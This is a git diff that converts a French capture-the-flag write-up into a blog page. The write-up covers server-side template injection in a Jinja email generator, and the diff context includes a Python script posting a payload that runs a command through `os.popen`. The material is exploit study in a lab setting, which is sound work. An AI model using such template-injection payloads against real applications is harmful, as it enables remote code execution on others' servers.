@@ -1,24 +1,28 @@
 ---
-tags:
-  - CTF
-date: 2026-02-13T14:42
-tasks:
-  - 
-parent files:
-  - 
+layout: writeup
 title: 'SSTI: "Jinja"'
-description: "0xFUN: Jinja challenge"
-category:
-  - challenges
+description: '0xFUN: Jinja challenge'
+excerpt: '0xFUN: Jinja challenge'
+date: 2026-02-13T14:42
+platform: ctf
+permalink: /writeups/ctf/2026/0xfun/jinja/
+year: '2026'
+event: 0xFUN
+tags:
+- CTF
+- '2026'
+prev_url: /writeups/ctf/2026/0xfun/tony-toolkit/
 ---
+
+{% raw %}
 
 # Recherches
 
 On se retrouve sur une page qui permet de générer des emails (ou un truc du genre).
 
-![[Pasted image 20260213144240.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-jinja/Pasted%20image%2020260213144240.png" alt="SSTI: &quot;Jinja&quot;" loading="lazy">
 
-![[Pasted image 20260213144252.png]]
+<img class="content-image" src="/assets/content/ctf/2026-0xfun-jinja/Pasted%20image%2020260213144252.png" alt="SSTI: &quot;Jinja&quot;" loading="lazy">
 
 On teste d'entrer `{{7*7}}@gmail.com` et on remarque que l'adresse email enregistrée est `49@gmail.com`. On a peut-être une piste.
 
@@ -44,3 +48,4 @@ payload = """{{cycler.__init__.__globals__.os.popen('../getflag').read()}}"""
 r = requests.post(url, data={'email': f'"({payload})" <fayred@example.com>'})
 print(r.text)
 ```
+{% endraw %}
